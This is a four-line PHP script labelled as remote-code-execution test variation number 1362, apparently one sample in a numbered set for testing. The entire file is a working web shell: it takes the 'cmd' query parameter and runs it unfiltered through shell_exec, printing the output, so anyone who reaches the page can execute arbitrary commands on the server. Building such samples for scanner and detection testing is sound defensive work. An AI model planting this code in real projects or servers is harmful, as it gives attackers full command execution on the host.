<?php
// RCE test variation #1362
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>